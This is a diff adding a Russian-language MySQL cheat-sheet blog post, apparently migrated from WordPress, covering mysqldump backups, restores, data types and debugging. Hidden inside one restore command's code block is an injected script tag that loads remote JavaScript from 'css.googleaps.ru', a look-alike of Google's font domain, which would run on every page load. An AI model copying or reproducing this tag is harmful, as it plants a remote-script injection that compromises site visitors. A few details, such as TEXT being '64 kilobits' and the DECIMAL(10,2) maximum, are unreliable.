@@ -1,0 +1,115 @@
+---
+layout: post
+status: publish
+published: true
+title: MySQL шпаргалки
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: |-
+  Часто, когда разрабатываешь сайт, замечаешь, как на одни и те же грабли наступают разработчики при проектировании базы данных.
+  Сегодня я решил опубликовать свои шпаргалки, на самые часто встречающиеся ошибки при работе с MySQL.
+wordpress_id: 181
+wordpress_url: http://devdocs.ru/?p=181
+date: '2014-09-10 08:59:38 +0300'
+date_gmt: '2014-09-10 08:59:38 +0300'
+categories:
+- MySQL
+tags:
+- Тема
+- php
+- ip
+- mysql
+- sql
+- innodb
+- ui
+comments: []
+---
+<p>Часто, когда разрабатываешь сайт, замечаешь, как на одни и те же грабли наступают разработчики при проектировании базы данных.<br />
+Сегодня я решил опубликовать свои шпаргалки, на самые часто встречающиеся ошибки при работе с MySQL.<a id="more"></a><a id="more-181"></a></p>
+<h2>Работа с бекапами<&#47;h2></p>
+<p><strong>Делаем бекап<&#47;strong></p>
+<pre class="brush: sql; gutter: true">mysqldump -u USER -pPASSWORD DATABASE > &#47;path&#47;to&#47;file&#47;dump.sql<&#47;pre></p>
+<p><strong>Создаём структуру базы без данных<&#47;strong></p>
+<pre class="brush: sql; gutter: true">mysqldump --no-data - u USER -pPASSWORD DATABASE > &#47;path&#47;to&#47;file&#47;schema.sql<&#47;pre></p>
+<p><strong>Если нужно сделать дамп только одной или нескольких таблиц<&#47;strong></p>
+<pre class="brush: sql; gutter: true">mysqldump -u USER -pPASSWORD DATABASE TABLE1 TABLE2 TABLE3 > &#47;path&#47;to&#47;file&#47;dump_table.sql<&#47;pre></p>
+<p><strong>Создаём бекап и сразу его архивируем<&#47;strong></p>
+<pre class="brush: sql; gutter: true">mysqldump -u USER -pPASSWORD DATABASE | gzip > &#47;path&#47;to&#47;outputfile.sql.gz<&#47;pre></p>
+<p><strong>Создание бекапа с указанием его даты<&#47;strong></p>
+<pre class="brush: sql; gutter: true">mysqldump -u USER -pPASSWORD DATABASE | gzip > `date +&#47;path&#47;to&#47;outputfile.sql.%Y%m%d.%H%M%S.gz`<&#47;pre></p>
+<p><strong>Заливаем бекап в базу данных<&#47;strong></p>
+<pre class="brush: sql; gutter: true">mysql -u USER -pPASSWORD DATABASE < &#47;path&#47;to&#47;dump.sql<&#47;pre></p>
+<p><strong>Заливаем архив бекапа в базу<&#47;strong></p>
+<pre class="brush: sql; gutter: true">gunzip < &#47;path&#47;to&#47;outputfile.sql.gz | mysql -u USER -pPASSWORD DATABASE<&#47;pre></p>
+<p><strong>или так<&#47;strong></p>
+<pre class="brush: sql; gutter: true">zcat &#47;path&#47;to&#47;outputfile.sql.gz | mysql -u USER -pPASSWORD DATABASE<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
+<p><strong>Создаём новую базу данных<&#47;strong></p>
+<pre class="brush: sql; gutter: true">mysqladmin -u USER -pPASSWORD create NEWDATABASE<&#47;pre></p>
+<p><strong>Удобно использовать бекап с дополнительными опциями -Q -c -e, т.е.<&#47;strong></p>
+<pre class="brush: sql; gutter: true">mysqldump -Q -c -e -u USER -pPASSWORD DATABASE > &#47;path&#47;to&#47;file&#47;dump.sql, где:<&#47;pre></p>
+<ul>
+<li>-Q оборачивает имена обратными кавычками<&#47;li>
+<li>-c делает полную вставку, включая имена колонок<&#47;li>
+<li>-e делает расширенную вставку. Итоговый файл получается меньше и делается он чуть быстрее<&#47;li><br />
+<&#47;ul></p>
+<p><strong>Для просмотра списка баз данных можно использовать команду:<&#47;strong></p>
+<pre class="brush: sql; gutter: true">mysqlshow -u USER -pPASSWORD<&#47;pre></p>
+<p><strong>А так же можно посмотреть список таблиц базы:<&#47;strong></p>
+<pre class="brush: sql; gutter: true">mysqlshow -u USER -pPASSWORD DATABASE<&#47;pre></p>
+<p>Для таблиц InnoDB надо добавлять &mdash;single-transaction, это гарантирует целостность данных бекапа.<br />
+Для таблиц MyISAN это не актуально, ибо они не поддерживают транзакционность.</p>
+<p><a href="http:&#47;&#47;www.bonsai.com&#47;wiki&#47;howtos&#47;misc&#47;mysql_admin&#47;">Подробнее<&#47;a></p>
+<h2>Общие факты<&#47;h2></p>
+<ul>
+<li>Полезно под каждую базу на боевом сервере создавать своего пользователя<&#47;li>
+<li>Кодировка базы может быть любой, если она UTF8<&#47;li>
+<li>В большинстве случаев лучше использовать движок InnoDB<&#47;li>
+<li>В php лучше забыть про сильно устаревшее расширение mysql и по-возможности использовать pdo или mysqli<&#47;li>
+<li>Новую копию MySQL всегда можно настроить и оптимизировать<&#47;li>
+<li>Без особой нужды не стоит открывать MySQL наружу. Вместо этого можно сделать проброс портов<br />
+ssh -fNL LOCAL_PORT:localhost:3306 REMOTE_USER@REMOTE_HOST<&#47;li><br />
+<&#47;ul></p>
+<h2>Работа с данными<&#47;h2></p>
+<p><strong>Числа<&#47;strong></p>
+<ul>
+<li>На 32-битных системах практически нет смысла ставить для типа INTEGER свойство UNSIGNED, так как такие большие числа в php не поддерживаются.<br />
+На 64-битных системах, php поддерживает большие числа, вплоть до MySQL BIGINT со знаком.<&#47;li></p>
+<li>Связанные таблицы (&laquo;Foreign keys&raquo;) должны иметь полное сходство по структуре ключей. Т.е. если у нас на одной таблице для поля указано &laquo;INTEGER UNSIGNED DEFAULT 0 NOT NULL&raquo; то и на другой должно быть указано аналогично<&#47;li>
+<li>Для хранения булевых значений, нужно использовать TINYINT(1)<&#47;li>
+<li>А деньги лучше хранить в DECIMAL(10, 2), где первое число обозначает количество всех знаков, включая запятую, а второе &mdash; количество знаков после запятой. Итого, у нас получится что DECIMAL(10,2) может сохранить 9999999,99<&#47;li><br />
+<&#47;ul></p>
+<p><strong>Строки<&#47;strong></p>
+<ul>
+<li>В старых версиях (до 5.0.3) VARCHAR была ограничена 255 символами, но сейчас можно указывать до 65535 символов<&#47;li>
+<li>Помните, что тип TEXT ограничен только 64 килобитами, поэтому что бы сохранять &laquo;Войну и Мир&raquo; пользуйтесь &laquo;LONGTEXT&raquo;<&#47;li>
+<li>Самая правильная кодировка для вашей БД UTF8<&#47;li><br />
+<&#47;ul></p>
+<p><strong>Даты<&#47;strong></p>
+<p>Не забывайте, что</p>
+<ul>
+<li>DATE, TIME, DATETIME &mdash; выводятся в виде строк, поэтому поиск и сравнение дат происходит через преобразование<&#47;li>
+<li>TIMESTAMP &mdash; хранится в виде UNIX_TIMESTAMP, и можно указать автоматически обновлять колонку<&#47;li>
+<li>Сравнивая типы данных DATETIME и TIMESTAMP, не забывайте делать преобразование типов, например:<br />
+SELECT * FROM table WHERE `datetime` = DATE(`timestamp`)<&#47;li><br />
+<&#47;ul></p>
+<p><strong>Перечисления <&#47;strong></p>
+<ul>
+<li>Для перечислений правильно использовать тип ENUM<&#47;li>
+<li>Правильно пишется так: ENUM(&lsquo;мама&rsquo;, &lsquo;мыла&rsquo;, &lsquo;раму&rsquo;)<&#47;li>
+<li>Можно ставить значение по-умолчанию, как и для любой строки<&#47;li>
+<li>В базе поле с перечислением хранится как число, поэтому скорость работы &mdash; потрясающе высокая<&#47;li>
+<li>Количество перечислений ~ 65 тысяч<&#47;li><br />
+<&#47;ul></p>
+<p><a href="http:&#47;&#47;dev.mysql.com&#47;doc&#47;refman&#47;4.1&#47;en&#47;storage-requirements.html">dev.mysql.com&#47;doc&#47;refman&#47;4.1&#47;en&#47;storage-requirements.html<&#47;a><br />
+<a href="http:&#47;&#47;help.scibit.com&#47;mascon&#47;masconMySQL_Field_Types.html">help.scibit.com&#47;mascon&#47;masconMySQL_Field_Types.html<&#47;a></p>
+<h2>Отладка<&#47;h2></p>
+<ul>
+<li>Если запросы тормозят, то можно включить лог для медленных запросов в &#47;etc&#47;mysql&#47;my.cnf<&#47;li>
+<li>А потом оптимизировать запросы через <a href="http:&#47;&#47;habrahabr.ru&#47;blogs&#47;mysql&#47;31129&#47;">EXPLAIN<&#47;a><&#47;li>
+<li>И наблюдать за запросами удобно через программу mytop<&#47;li><br />
+<&#47;ul></p>
